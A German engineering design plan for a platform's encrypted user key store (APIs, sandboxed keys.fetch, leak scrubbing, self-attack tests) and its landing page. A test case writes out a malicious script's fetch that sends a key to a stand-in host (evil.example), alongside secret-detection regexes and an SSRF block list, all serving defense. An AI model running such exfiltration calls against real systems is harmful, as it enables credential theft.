# KEYSTORE_MASTER_KEY_V2  — optionaler Nachfolger fuer die Rotation (scripts/rotateKeystore.cjs); V1 bleibt zum Lesen alter Zeilen, bis die Rotation durch ist.
```

#### 4c.3 Verwaltung: REST, UI, MCP

`api/routes/KeysRouteHandler.ts` (neu), registriert in `createHttpApplication.ts` neben `kennelRunHandler.registerRoutes` (:291); `requireLogin` (exportiert in P4) plus **echte `user.id`** — Superuser ohne user -> 403 `no_identity`.

```
POST   /api/keys              {alias, secret, allowedDomains: string[], kennelGrants?: string[], quotaPerDay?: number}
                              -> 200 {ok, key: {alias, last4, allowedDomains, kennelGrants, quotaPerDay, createdAt, lastUsedAt}}   (Upsert je (ownerId, alias))
                              400 invalid_alias (^[a-z0-9][a-z0-9_-]{0,31}$) | invalid_secret (leer, > 4096 Zeichen) | invalid_domains (leer, kein Hostname, Wildcard nur als *.example.com) | quota_required (kennelGrants ohne quotaPerDay)
                              503 keystore_disabled (kein KEYSTORE_MASTER_KEY_V1)
GET    /api/keys              -> 200 {ok, keys: [ …maskiert wie oben… ]}     nur eigene (ownerId = ctx.user.id); kein Klartext, kein GET-by-alias mit Wert
DELETE /api/keys/:alias       -> 200 {ok} (idempotent); 404 wenn fremd oder unbekannt (nichts verraten)
```

UI: **in der App unter `/account` (Tab `keys`), P6 U7** — kein serverseitiges HTML fuer Keys (Lotus, W20). Formular alias/secret/allowedDomains/(Grants, Quota), maskierte Liste, Loeschen mit Confirm; der Wert wird **nie** angezeigt. Pflichthinweis auf der Seite (Follie 4.7, englisch): "Keys are used by dogs through keys.fetch and {{key:alias}}. They never leave the server and won't survive a database reset. You'll have to add them again." Zustand `keystore_disabled` (503): "The key store is off on this server." P4c liefert nur die API; `/auth/tokens` (PAT-Seite) bleibt unveraendert, bis U7 die Tokens ebenfalls in die App holt.

MCP (`mcp/tools/keys.ts`, neu, in die Aggregation): `set_key {alias, secret, allowedDomains[], kennelGrants?, quotaPerDay?}`, `list_keys` (maskiert), `delete_key {alias}`. **Kein `get_key`, niemals.** Werkzeugtexte: "Agents may set keys, never read them; dogs use `keys.fetch` with `{{key:alias}}`." Doku in `mcp/werkzeugkasten.ts` (Werkzeugkasten-Brief) und `mcp/skill.md`.

#### 4c.4 Laufzeit-Vertrag im Dog (nur Option B)

Neue VM-Capability `keys` (registriert in `main.ts` neben `jsonStore` :82-119), Bridge-Methoden `keys.fetch(url, opts)` und `keys.list()` (nur Aliase). Kein `keys.get`.

```ts
const r = await keys.fetch('https://api.openai.com/v1/chat/completions', {
  method: 'POST',
  headers: { Authorization: 'Bearer {{key:openai}}' },
  body: JSON.stringify({ … })
});
// r = { status: number, headers: Record<string,string> (ohne set-cookie/authorization), body: string }
```

Host-Ablauf je Aufruf (`services/KeyStoreService.ts` + `services/keysCapability.ts`):

```
1. Runner-Identitaet aus capabilityCtx: userId fehlt oder isSuperUser ohne userId -> Fehler 'keys_unavailable' (fail-closed). Ausnahme: kennelGrants (5.)
   Zusatz aus P3.5 (Nira 3, Nebenwirkung 1): der rufende Dog muss fuer den Runner READ haben (`canRead(dog, ctx)`); ein run-only-Fremddog bekommt 'keys_unavailable' — Code, den ich nicht lesen darf, verbraucht meine Keys nicht.
2. Platzhalter {{key:<alias>}} in URL, Header-Werten und Body finden; jeder Alias -> UserKey(ownerId = Runner, alias) laden + entschluesseln (Memo je Lauf)
   unbekannter Alias -> Fehler 'key_not_found:<alias>' (Text ohne Wert)
3. Zieldomain (Hostname der URL nach Substitution) gegen allowedDomains JEDES verwendeten Keys pruefen (exakt oder *.suffix); nicht gelistet -> 'domain_not_allowed'
   zusaetzlich: Hostname darf nicht auf private/loopback/link-local Adressen aufloesen (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) — SSRF-Sperre innerhalb von keys.fetch, unabhaengig von 8.9
4. Quota: quotaPerDay gesetzt -> usedDayStamp != heute ? usedToday=0 ; usedToday >= quotaPerDay -> 'quota_exceeded' ; sonst usedToday++ (atomar: UPDATE … WHERE usedToday < quotaPerDay)
5. fetch ausfuehren (Host, Timeout wie VM-Timeout); Antwort: status, gefilterte Header, Body als Text — nie die gesendeten Header zurueckgeben
6. lastUsedAt setzen; die substituierten Klartextwerte in ein Set `usedSecrets` des Laufs legen (fuer den Scrub 4c.6)
7. Fehlertexte sanitisieren: Upstream-Body nur, wenn er keinen usedSecrets-Wert enthaelt; sonst '[redacted:key]'
```

`keys.list()` -> `[{alias, last4, allowedDomains}]` des Runners.

#### 4c.5 Wessen Schluessel laeuft wann (Entscheidungstabelle, Nira 5, mit Lotus-Regel)

Grundregel: Keys loesen sich nach der Identitaet des **Runners** auf (wer den Lauf ausloest), nie nach dem Kennel-Owner — ausser bei explizitem `kennelGrants`-Eintrag (8.8).

| Szenario | Runner | Welcher Key | Erlaubt | Kostentraeger |
|---|---|---|---|---|
| Eigenes Kennel, Owner eingeloggt | Owner | Owner (alias) | ja | Owner |
| Fremdes oeffentliches Kennel, anonym | keiner | keiner (`anon` hat keine Keys) | Lauf ohne Key; der Key-Dog schlaegt sauber fehl (`keys_unavailable`) | — |
| Oeffentliches Kennel **mit** `kennelGrants` (8.8, wenn ja) | keiner/Besucher | Owner-Key, nur wenn `kennelLineageId` in `kennelGrants` | ja, gedeckelt per `quotaPerDay` (Pflicht) | Owner (bewusst) |
| Editor in Owner-Kennel | Editor | Editor-eigene Keys | ja; Owner-Key nur via Grant | Editor |
| Fremder Dog-Autor (Dog in meinem Kennel) | Ich | meine Keys, nur via `keys.fetch` | Nutzung ja, Auslesen nein | Ich (Quota) |
| Mimic | wie SerializedDog | Runner | wie oben | Runner |
| Snapshot-Refresh | `triggerUserId` (Refresher) | Refresher | ja; Ergebnis enthaelt keinen Key | Refresher |
| MCP-Lauf (PAT) | PAT-User | PAT-User | Nutzung ja, `get_key` nie | PAT-User |
| Superuser (`MCP_AUTH_REQUIRED=false`), `user:null` | keiner | keiner (fail-closed) | Laeufe ohne Keys normal; `POST /api/keys` 403 `no_identity` | — |

Dev-Komfort: optional `KEYSTORE_SUPERUSER_OWNER=<userId>` — dann loest der Superuser-Lauf die Keys dieses Nutzers auf. Nur lokal, nie auf integration (Runbook setzt ihn nicht).

#### 4c.6 Leck-Verschluesse je Flaeche

| Flaeche | Massnahme |
|---|---|
| L1/L4/L5/L9 (Waves, Snapshot, Lead-Yield) | Mit Option B enthaelt weder `collected` noch `vmContext` einen Klartext-Key (die `keys`-Capability ist ein Funktions-Bundle, serialisiert zu `{}`). **Zusaetzlich (Defense-in-Depth) Yield-Scrub:** je Lauf das Set `usedSecrets`; vor (a) `sendResult` (`KennelRunHandler.ts:438-461`), (b) jedem Dog-`result` in `WavesConverter.ts:390`, (c) Snapshot vor `markOk` (`KennelSnapshotCache.ts:55-67`), (d) Fehlertexten (:488-494) jeden Wert durch `[redacted:key]` ersetzen. Scrub arbeitet auf dem serialisierten String (JSON/HTML/Text) — ein Wert unter 8 Zeichen wird nicht gescrubbt (False-Positive-Schutz; solche Keys lehnt `POST /api/keys` ab: `invalid_secret`). |
| L4/L5 (per-Dog-Redaktion) | P1 Commit 4. |
| L6 (Egress) | Allowlist + private-Netz-Sperre in `keys.fetch` (4c.4 Schritt 3). Globaler Filter fuer den nativen Worker-`fetch`: Entscheidung 8.9. |
| L7 (Logs) | Worker-`console` bleibt nativ; Host-seitig scrubbt ein `process.stdout`-Hook nicht — stattdessen: der Worker bekommt `console` ueber die Bridge (`SerializedDog.ts:267-272` -> Bridge-Methode `console.log/warn/error`), der Host scrubbt `usedSecrets` vor der Ausgabe. Kosten: ein RPC je Log-Zeile; Verbose bleibt in prod aus. |
| L8 (Errors) | `keys.fetch`-Fehler sanitisiert (4c.4 Schritt 7); `__error` (`harverster.ts:106`) wird vor `WavesConverter.ts:391` gescrubbt. |
| L10 (Export) | Key-Store wird nicht exportiert. Zusaetzlich: `KennelBundleHandler.ts:102-127` scannt `theRun`/`defaultBody`/`defaultQuery` auf rohe Key-Muster (`sk-[A-Za-z0-9]{20,}`, `AKIA[0-9A-Z]{16}`, `ghp_[A-Za-z0-9]{36}`, `Bearer [A-Za-z0-9._-]{20,}`) und ersetzt sie durch `[redacted]` mit Hinweis im Bundle; `{{key:*}}`-Platzhalter reisen unveraendert. |
| L11 (at rest) | GCM fuer den Key-Store; `jsonStore` bleibt Klartext (dort gehoeren keine Keys hin; Werkzeugkasten-Text sagt das). |
| L12 (Verbose) | unveraendert (Namen, nicht Werte). |

#### 4c.7 Randfaelle

| Fall | Verhalten |
|---|---|
| `KEYSTORE_MASTER_KEY_V1` fehlt | Key-Store aus: `POST /api/keys` 503, `keys.fetch` -> `keys_unavailable`; alles andere laeuft. |
| Falscher Master-Key (GCM-Tag-Fehler) | `keys.fetch` -> `key_undecryptable:<alias>`; Log einmal je Prozess; kein Absturz. |
| Rotation V1 -> V2 | `rotateKeystore.cjs` liest V1, schreibt V2, setzt `keyVersion 2`; danach V1 aus der Env nehmen; Zeilen mit unbekannter `keyVersion` -> `key_undecryptable`. |
| Alias in Platzhalter unbekannt | `key_not_found:<alias>` (Wert nie im Text). |
| Platzhalter in `defaultQuery` (lowercased durch `mergeQueryParams`) | Aliase sind lowercase-only (`invalid_alias`), also unbeschadet. |
| Ziel-URL nach Substitution zeigt auf privates Netz | `domain_not_allowed` — auch wenn die Domain in der Allowlist steht (DNS-Rebinding: Aufloesung vor dem Fetch pruefen und die aufgeloeste Adresse verwenden). |
| Redirect des Upstreams auf fremde Domain | `keys.fetch` folgt Redirects **nicht** (`redirect: 'manual'`); 3xx wird als Status zurueckgegeben. |
| Zwei Keys in einem Aufruf | beide muessen die Zieldomain erlauben; Quota zaehlt je Key. |
| Quota-Reset | `usedDayStamp` in UTC (wie `KennelCallDaily`). |
| DB-Reset | Keys weg; UI-Hinweis; kein Backup (Entscheidung 8.10 bestaetigen). |
| User geloescht | heute kein Pfad im Code; Zeilen bleiben verwaist — DB ist wegwerfbar. |
| Export/Import eines Kennels mit `{{key:openai}}` | Platzhalter reist; der Importeur braucht einen eigenen Key `openai`, sonst `key_not_found`. |

#### 4c.8 Testfaelle — Selbstangriff (Given/When/Then; StartupTest mit Fake-Auth-Client, Fake-fetch)

- **T1 Editor-Diebstahl** — Given Owner U1 mit Key `openai`, Editor U2 legt Dog mit `keys.fetch(...'{{key:openai}}'...)` in U1s Kennel; When U2 laeuft; Then `key_not_found:openai` (U2 hat keinen Alias `openai`), kein Wert im Result/Error. Given `kennelGrants` enthaelt den Kennel (8.8 = ja); When anonym ueber `/k/`; Then Aufruf mit U1-Key, `usedToday` +1, Wert nirgends im Yield.
- **T2 Fremder-Dog-Exfil** — Given boesartiger Dog `fetch('https://evil.example/?k=' + …)` mit nativem `fetch`; When Lauf; Then kein Key verfuegbar (nie in der VM). Given Dog `keys.fetch('https://evil.example', {headers:{X:'{{key:openai}}'}})`; Then `domain_not_allowed`, Fake-fetch nicht aufgerufen.
- **T3 Anon Public-Yield** — Given oeffentlicher Kennel mit Key-Dog, kein Grant; When anonym ueber `/k/`; Then `keys_unavailable` im Dog-Error, Lead-Yield ohne Wert.
- **T4 Snapshot-Quergriff** — Given U1 refresht Snapshot mit Key-Nutzung; When U2 liest `get_snapshot_dog_result/_vmcontext`; Then kein Wert (Option B) und per-Dog-Redaktion (P1 Test 5).
- **T5 DB-Leser** — Given Zeile in `UserKey`; Then `ciphertext` != Klartext; Entschluesseln mit falschem Master-Key -> Fehler; mit richtigem -> Klartext nur im Speicher des Service.
- **T6 Log** — Given Dog `console.log(await keys.fetch(...))` und Fake-Upstream, der den Auth-Header echot; When Lauf; Then Log-Zeile enthaelt `[redacted:key]`, nie den Wert.
- **T7 Superuser-Falle** — Given `ctx = {user:null, isSuperUser:true}`; When `keys.fetch`; Then `keys_unavailable`; When `POST /api/keys`; Then 403 `no_identity`. Given `KEYSTORE_SUPERUSER_OWNER=U1`; Then Keys von U1.
- **T8 IDOR** — Given U1 Key `openai`, U2 eingeloggt; When `GET /api/keys` als U2; Then leer; When `DELETE /api/keys/openai` als U2; Then 404 und U1s Key existiert weiter.
- **T9 Export-Scan** — Given Dog-Code mit `sk-abcdefghijklmnopqrstuvwx`; When Export; Then `[redacted]` im Bundle, Platzhalter `{{key:x}}` unveraendert.
- **T10 Rotation** — Given Zeile mit V1; When `rotateKeystore` mit V1+V2; Then `keyVersion 2`, Entschluesseln mit V2 liefert denselben Klartext; Klartext erscheint nicht in stdout.
- **T11 Integration (lokal, `MCP_AUTH_REQUIRED=true`)** — `set_key` per MCP, `list_keys` maskiert (`last4`), `tools/list` enthaelt kein `get_key`; `execute_kennel` eines Kennels mit `{{key:…}}` gegen einen lokalen Fake-Upstream liefert Status 200 im Dog-Result ohne Wert.

#### 4c.9 Abnahmekriterien (messbar)

- Tests T1-T11 gruen; `npm test` gruen.
- `git grep -n "get_key\|keys.get(" -- mcp services packages` = 0.
- Klartext-Suche: nach einem Lauf mit Key gegen den Fake-Upstream taucht der Testwert in keinem von `result`, `vmContext`, Snapshot-JSON, `__error`, stdout, Export-Bundle auf (Test-Harness grep ueber alle sechs Ausgaben).
- `keys.fetch` mit nicht gelisteter Domain: Fake-fetch-Zaehler 0.
- Zeilen in `UserKey` enthalten den Testwert nicht (`SELECT` + grep).
- Rotation V1 -> V2 ohne Klartext auf stdout.

#### 4c.10 Commit-Schnitt

1. `feat(auth): UserKey-Modell + KeyStoreService (AES-256-GCM, keyVersion, Rotation-Skript)` — Schema (beide Dateien), `services/KeyStoreService.ts`, `scripts/rotateKeystore.cjs`, Env-Doku. T5, T10.
2. `feat(api): /api/keys REST (maskiert, kein Klartext-Read)` — `KeysRouteHandler.ts`, Registrierung; UI ist P6 U7. T8.
3. `feat(core+vm): keys.fetch/keys.list Capability (Platzhalter, Allowlist, private-Netz-Sperre, Quota, Host-Bridge), console ueber Bridge` — `main.ts`, `services/keysCapability.ts`, `SerializedDog.ts` (console-Bridge), Werkzeugkasten. T1-T3, T6, T7.
4. `feat(mcp): set_key/list_keys/delete_key (kein get_key), skill.md` — `mcp/tools/keys.ts`. T11.
5. `feat(security): Yield-/Error-/Snapshot-Scrub + Export-Scan (Defense-in-Depth)` — `KennelRunHandler.ts`, `WavesConverter.ts`, `KennelSnapshotCache.ts`, `KennelBundleHandler.ts`. T4, T9.
6. (falls 8.8 = ja) `feat(keys): kennelGrants mit Pflicht-Quota fuer oeffentliche Laeufe` — Service, Handler (UI in U7). T1 zweiter Teil.
7. `docs(mcp): Texte fuer P4c` — 4.0.

Niras Commit 5 (L4/L5) ist P1 Commit 4. Abhaengigkeiten: 2 <- 1; 3 <- 1; 4 <- 1; 5 <- 3; 6 <- 3 + 2. Reihenfolge: nach P4b, vor P5. `packages/core` wird nur in `SerializedDog.ts` (console-Bridge) beruehrt — kein Pakt, kein Schema.

#### 4c.11 Dateien

`store/prisma-auth/schema.prisma`, `store/prisma/schema.postgres.prisma` (Auth-Block) · `services/KeyStoreService.ts` (neu) · `services/keysCapability.ts` (neu) · `scripts/rotateKeystore.cjs` (neu) · `api/routes/KeysRouteHandler.ts` (neu) · `mcp/tools/keys.ts` (neu) + Aggregation · `mcp/werkzeugkasten.ts`, `mcp/skill.md` · `main.ts` (Capability-Registrierung) · `packages/core/src/dogs/SerializedDog.ts` (console-Bridge) · `api/routes/KennelRunHandler.ts`, `services/WavesConverter.ts`, `mcp/snapshots/KennelSnapshotCache.ts`, `api/routes/KennelBundleHandler.ts` (Scrub/Scan) · `.env.example`, `.env.integration.example` · `StartupTest.ts`, `mcp/integration/mcp-gateway.integration.cjs`. Nicht anfassen: `services/JsonStorageService.ts` (bleibt, was es ist), `packages/dogs-*`.

### P5 — Landing (technischer Rahmen steht; Optik: neue Vorlage, folgt)

> **Aenderung 2026-09-25 abends (10-0, ersetzt "statische Datei" als Hauptweg):** "finde es lustig einfach als landing page ein bereits existierenden kennel zu haben und dann zu wechseln" — `/` liefert die Ausgabe des Kennels `slopdogs-landing` (Dogfooding). Aufbau: `SlopdogsLandingContent` (Inhalt, Quelle Neon Alley + Base-Dogs-Pointe aus Breakout) · vier Skin-Dogs (a Breakout, b Zine, c Mixtape (Blueprint-Fassung gesichert als skin_c_blueprint.js), d Neon Alley) · Lead waehlt per `?look=a|b|c|d` (Default: Entscheidung 10-0), jede Seite traegt einen Look-Umschalter. Pflichten dazu:
> 1. **Quelle im Repo:** Content- und Skin-Dogs liegen als Seed unter `seed-data/kennels/slopdogs-landing*` und werden idempotent veroeffentlicht (Instanz wird regelmaessig geleert, [[project_datadogs_fluechtig]]). Env `LANDING_KENNEL_ID` (Default `slopdogs-landing`).
> 2. **Kein Voll-Lauf je Besuch:** `app.get('/')` bedient die Lead-Ausgabe aus einem HTML-Memo (Env `LANDING_HTML_MEMO_MS`, Default 300000, je `look`); Refresh im Hintergrund; der Aufruf zaehlt nicht in die Rangliste (Quelle `landing`, nicht ranked).
> 3. **Fallback:** scheitert der Lauf oder ist der Kennel weg, liefert `/` die statische `public/landing/index.html` (gerenderter Default-Look aus dem Build) — die Seite ist nie leer, auch im Kaltstart nicht.
> 4. Kosten ehrlich: alle vier Skins laufen je Kennel-Lauf mit (ein Isolate je Dog); das Memo macht daraus einen Lauf je Look und Memo-Fenster. Nicht gemessen — Messpunkt in der Abnahme (RSS vor/nach Landing-Lauf).
> Der Rest dieses Abschnitts (Datenvertrag `/api/landing`, Zustaende, Budget, self-hosted Fonts) gilt weiter; "statische Datei" ist jetzt der Fallback.

> **Aenderung 2026-09-26 (10-0): nur Mixtape.** "bitte nur mixtape ohne optionen" — der Seed `slopdogs-landing` traegt nur noch `SlopdogsLandingContent` + `SlopdogsLandingSkinC` (Mixtape) + `SlopdogsLandingLead` (dogIds `[lead, content, skinC]`, kein `base:QueryRetriever`). Kein `?look=`, kein Umschalter im HTML; die Skins a (Breakout), b (Zine), d (Neon Alley) liegen unveraendert unter `docs/slopdogs/landing/archive/` (nicht geseedet). `scripts/build-landing.cjs` rendert Content -> Skin C -> Lead (`render()`), der Fallback `public/landing/index.html` folgt (34.159 B, 10.189 B gzip). Das Memo ist je Kennel, nicht mehr je Look. Wo dieser Abschnitt noch von vier Looks und `?look=` spricht, ist das ueberholt. Der Seed ist idempotent: eine Instanz mit dem alten Vier-Look-Kennel behaelt ihn, bis der Kennel geloescht oder die Instanz geleert ist. Copy und Design der Landing (packs-Beispiele, /kennels-Links) entscheidet der Frame (Protokoll 1.2).

> **Aenderung 2026-09-26 (10-0): Landing-Rotation.** "wir wollen mehrere landing pages in rotation haben, aus .env und kennel id. die sind dann immer schreibgeschuetzt. wenn die in der .env sind. der seed kennel ist nur absolutes default"
> 1. **Env `LANDING_KENNEL_IDS=a,b,c`** (kommagetrennt, Leerstellen und Doppelte egal, Gross-/Kleinschreibung wie Kennel-IDs). Der alte Einzelwert `LANDING_KENNEL_ID` bleibt als Alias lesbar (ein Eintrag, eine Logzeile). Quelle: `mcp/auth/landingKennels.ts`.
> 2. **Rotation:** jeder Besuch von `/` zieht gleichverteilt zufaellig einen gelisteten Kennel (Fisher-Yates ueber die Liste; der naechste in der gemischten Reihenfolge springt ein). Begruendung: zustandslos (kein Cookie, kein Zaehler ueber Prozesse hinweg), auf Dauer gleich oft je Kennel, und das Memo je Kennel haelt die Kosten bei einem Lauf je Kennel und Memo-Fenster — nicht je Besuch. `?landing=<id>` erzwingt einen Kennel **aus der Liste** (andere IDs werden ignoriert). Antwort-Header `X-Landing-Kennel`; mit mehr als einem gelisteten Kennel `Cache-Control: no-cache` (sonst hielte ein Cache einen Besuch fuenf Minuten fest), erzwungen oder einzeln weiter `public, max-age=300`.
> 3. **Uebersprungen** wird ein gelisteter Kennel, der fehlt, nicht oeffentlich ist, wirft oder kein HTML liefert — fuer das Memo-Fenster (ein Lauf, dann Ruhe). **Standard:** der geseedete `slopdogs-landing` greift, wenn die Liste leer ist oder keiner der gelisteten laeuft; dahinter der statische Fallback.
> 4. **Schreibschutz:** ein gelisteter Kennel ist fuer **alle** gesperrt — Owner und Super-User eingeschlossen —, solange er in der Env steht: wie frozen, aber aus der Env abgeleitet (kein DB-Flag) und ohne Auftauen. `canMutate` false, `canManageAcl` false; `myRights` `{edit:false, own:false, locked:'landing'}` (neues Feld `locked: 'landing' | 'frozen' | null`, landing vor frozen). REST PUT, rename, DELETE, `/acl`, `/acl/transfer`, `/freeze`, `/unfreeze` und MCP `update_kennel`, `delete_kennel`, ACL-Werkzeuge antworten 403 `{"error":"locked_landing","error_description":"Locked: this kennel is a landing page (LANDING_KENNEL_IDS)."}` (MCP: Text mit Praefix `locked_landing:`). Laeufe, Sterne, Lesen, Export/Kopieren bleiben. Der Seed-Default ist **nicht** automatisch gesperrt, nur wenn er gelistet ist. Die Dogs eines Landing-Kennels sind nicht gesperrt (eigene Rechte; wer sie aendert, aendert die Landing — pinnen, falls das stoert).
> 5. **UI:** Kennel-Kopf mit Chip `landing`, Mutations-Controls sichtbar aber disabled mit title "Locked: this kennel is a landing page (LANDING_KENNEL_IDS).", Settings read-only mit diesem Hinweis, ohne Unfreeze.
> 6. **Tests:** StartupTest "Landing-Rotation" (Env-Parsing inkl. Alias, Verteilung ueber zwei Kennels, fehlender uebersprungen mit einem Lauf je Fenster, `?landing=` nur Gelistete, leere Liste -> Default, keiner laeuft -> Default, auch der nicht -> Fallback) und "Landing-Schreibschutz" (Owner und Super-User: PUT, rename, DELETE, PUT /acl, freeze, MCP update_kennel/delete_kennel/freeze_entity -> 403 `locked_landing`; aus der Liste genommen wieder frei).

**Ziel.** `/` liefert eine statische HTML-Datei, die ohne einen einzigen `/api`-Aufruf vollstaendig steht, die Ranglisten aus `GET /api/landing` nachlaedt und den Kaltstart ehrlich zeigt. Inhaltlich beantwortet sie die vier Fragen des 10-0: was ist es, was kann es, wie nutze ich es, was gibt es schon. Das visuelle Design (Palette, Typografie, Layout, Texte, Bewegung, Wortmarke, Favicon-Form) kommt aus Follies **neuer** Vorlage — nichts aus `slopdogs_landing_vorlage.html` oder der Richtung "Trog" wird uebernommen. Was hier steht, gilt fuer jede Vorlage.

**Dateien.**

| Datei | Aenderung |
|---|---|
| `public/landing/index.html` (neu) | die Landing, alles inline (CSS, ein kleines Skript), keine Build-Stufe |
| `public/landing/robots.txt` (neu) | `User-agent: *` / `Allow: /` / `Disallow: /api/` / `Disallow: /auth/` / `Disallow: /mcp` / `Disallow: /actions/` / `Sitemap:` weglassen |
| `public/landing/<font>.woff2` (neu, 0-2 Dateien) | self-hosted Webfont-Schnitte, ausgeliefert unter `/static/landing/<font>.woff2` |
| `ui-app/public/favicon.svg` (neu), `ui-app/public/favicon.ico` (ersetzen oder behalten) | Favicon nach Vorlage; `ui-app/src/index.html:8` -> `<link rel="icon" type="image/svg+xml" href="/favicon.svg">` + `<link rel="alternate icon" href="/favicon.ico">` |
| `ui-app/src/index.html:5` | Titel bereits `SlopDogs` (P2 R8); OpenGraph-Tags fuer die SPA sind nicht noetig (Teilen-Links zeigen auf `/k/…`) |
| `server-app/httpFrontEnd.builtUi.ts`, `httpFrontEnd.development.ts` | Haken aus P3 Commit 5 wird scharf: Datei existiert -> ausliefern |
| `ui-app/src/app/pages/waves-viewer/components/waves-app-bar.component.html:2` | unveraendert (`/kennels`); der Link zur Landing sitzt dort, wo die Vorlage die Wortmarke setzt, als `<a href="/">` |
| `README.md` | Abschnitt "Landing" mit Datenvertrag und Zustaenden |

**Auslieferung.** `GET /` -> `res.sendFile(public/landing/index.html)` mit `Cache-Control: public, max-age=300`; `HEAD /` gleich (ki-fruechte-Keepalive `builder.js:113,1028`). In `development` dieselbe Datei (kein 302 mehr auf :4300; die SPA bleibt unter `/kennels` via `ng serve`-Proxy erreichbar — Entwickler oeffnen :4300 direkt). Assets ueber `/static/landing/…` (`express.static(publicDir)` `createHttpApplication.ts:175`). Kein Angular, kein Build-Schritt, keine Route in `app.routes.ts` (dort ist `''` -> `kennels`, wirkt nur bei Client-Navigation).

**Datenanbindung `GET /api/landing` (Vertrag 4.7, woertlich).**

```
Skript in index.html:
  t0 = now; state = 'loading'
  fetch('/api/landing?limit=<n aus Vorlage, Default 10>', {headers:{Accept:'application/json'}})
    Backoff bei Netzfehler/5xx: 2 s, 5 s, 10 s, danach alle 15 s, Abbruch nach 150 s -> state 'error'
    ab 2,5 s ohne Antwort: state 'waking'  (Kaltstart Render, bis 150 s — gemessen von Follie/Boreal als Prozess-Boot)
  200 -> beide Listen leer?  state 'empty'  : state 'data'
  Rendering aus JSON: name, emoji (Fallback 🐕), description (kommt gekuerzt), url (fertig, inkl. Praefix und defaultQuery — die Landing baut keine Pfade),
                      stats.calls.ranked30d (W3), stats.rating.avg/count (avg null -> Sternfeld leer, nie 0 erfinden)
  Zahlen englisch formatiert (8.13): new Intl.NumberFormat("en-US") fuer ranked30d; avg mit einer Nachkommastelle und Punkt
  provenDogs (P4b 4b.7): displayName, description, icon, stats.reuse.kennelsTransitive, stats.proven.badge — "was gibt es schon" auf Dog-Ebene;
                         Link je Dog nach /kennels?q=<displayName> (Dogs haben keine Public-URL)
```

Kein zweiter Endpunkt, kein `/api/kennels` von der Landing (Heavy-Pfad, gemessen 0,53-1,41 s am 23.09. auf int — Follie 1.5). Eine Suche, falls die Vorlage eine vorsieht, verlinkt nach `/kennels?q=<text>` (Formular `action="/kennels" method="get"`); Inline-Treffer nur, wenn die Vorlage sie verlangt, dann `GET /api/kennels?q=&limit=8` ab drei Zeichen, 300 ms entprellt, und derselbe Wach-Zustand.

**Zustaende (muessen in der Vorlage sichtbar sein; Texte liefert die Vorlage).**

| Zustand | Ausloeser | Verhalten |
|---|---|---|
| `loading` | Seite steht, Fetch laeuft < 2,5 s | Platzhalter-Zeilen ohne Zahlen, kein Shimmer-Zwang |
| `waking` | > 2,5 s ohne Antwort | Hinweis auf den Kaltstart (`aria-live="polite"`), Fetch laeuft weiter |
| `data` | 200 mit mindestens einer nicht-leeren Liste | Listen gerendert; leere Einzelliste zeigt ihren eigenen Leertext |
| `empty` | 200, beide Listen leer (Tracking frisch, keine Sterne) | ehrlicher Leertext, keine Platzhalterzahlen |
| `error` | Netzfehler/5xx nach 150 s oder 4xx | Fehlertext + Knopf "Nochmal" (startet den Fetch neu) |

Statische Bloecke (Was ist es / Was kann es / Wie nutze ich es / MCP-Anbindung / Fusszeile) stehen in jedem Zustand. `location.origin` fuellt die MCP-URL (`<origin>/mcp`) und den `claude mcp add`-Befehl; Kopierknopf via `navigator.clipboard.writeText` mit Rueckfall (Text markieren). Login-Link `/auth/google/login?returnTo=/kennels` (`returnTo` same-origin, `router.ts:27-33`). Knoepfe in die App: `/kennels`, `/kennels?new=1`.

**Gewichtsbudget (gilt fuer die neue Vorlage; Zahlen gesetzt, nicht gemessen — gemessen wird beim Bau).**

| Posten | Grenze |
|---|---|
| `index.html` inkl. Inline-CSS und Skript | <= 40 KB unkomprimiert, <= 15 KB gzip |
| Webfont | 0 bis 2 Schnitte, je <= 30 KB woff2, Latin-Subset, `font-display: swap`, self-hosted unter `/static/landing/`; **kein** Google-Fonts-CDN, kein `<link rel=preconnect>` auf fremde Hosts |
| Bilder ueber der Falte auf dem Handy | keine |
| Bilder ab Desktop | nur wenn die Vorlage es verlangt; dann AVIF mit WebP-Rueckfall, `loading="lazy"`, `bg1.avif` 162.297 B nur nach Merge von f306a17 (W6), nie `bg1.png` (3.468.582 B) |
| JS | inline, <= 5 KB, kein Framework, kein GSAP, kein Canvas, kein Video/iframe (Lehren aus `landing-page` 994ec41, Boreal H) |
| Externe Requests beim Laden | genau einer: `/api/landing` (plus Font aus derselben Origin) |
| Kennel-Laeufe | keine — kein Iframe, keine Vorschau (512 MB, `--max-old-space-size=320`) |

Font-Beschaffung (Verfahren, unabhaengig von der Schriftwahl): OFL-lizenzierte Schrift aus dem Google-Fonts-GitHub-Spiegel laden, mit `pyftsubset` (fonttools) auf `--unicodes="U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD"` und `--flavor=woff2` subsetten; Groesse pruefen; Lizenzdatei neben die Fontdatei (`public/landing/OFL.txt`).

**Mobile-first und Zugaenglichkeit (Vorlagen-unabhaengig).** Referenz 375 px; keine horizontale Scrollflaeche; Touch-Ziele >= 44 px; Suchfeld (falls vorhanden) 16 px Schrift (kein iOS-Zoom); `env(safe-area-inset-*)`; `lang="en"` (8.13: Englisch, Landing und App); `prefers-reduced-motion` respektiert; `prefers-color-scheme` ueber Tokens auf `:root`; Ranglisten als `<ol>`; Emoji `aria-hidden`; Kontraste >= 4,5:1 fuer Text; `:focus-visible` sichtbar. OpenGraph: `og:title`, `og:description`, `og:url`, `og:image` (nur wenn die Vorlage ein Bild liefert; sonst weglassen, nicht erfinden).

**Was aus der verworfenen Vorlage weiterhin gilt (nur Technik):** statische Datei unter `/`; Daten per `/api/landing`; die vier Zustaende `data`/`waking`/`empty`/`error` als `data-state`-Attribut; Vorlage-Schalter (der Schalter-Balken und das zugehoerige Skript) kommen **nicht** in den Bau; Beispielwerte kommen nicht in den Bau; Google-Fonts-Links kommen nicht in den Bau. Was **nicht** gilt: Palette, Schrift, Papierkorn, Wortmarke mit Napf, Tageskarten-Metapher, Texte, Wireframes, Bausteine fuer Badge und Rating.

**Testfaelle.**

1. Given Server lokal ohne DB-Verbindung fuer `/api/landing` (Handler wirft); When `GET /`; Then 200 `text/html` binnen 100 ms, Seite rendert alle statischen Bloecke, Zustand nach 2,5 s `waking`, nach 150 s `error` mit "Nochmal".
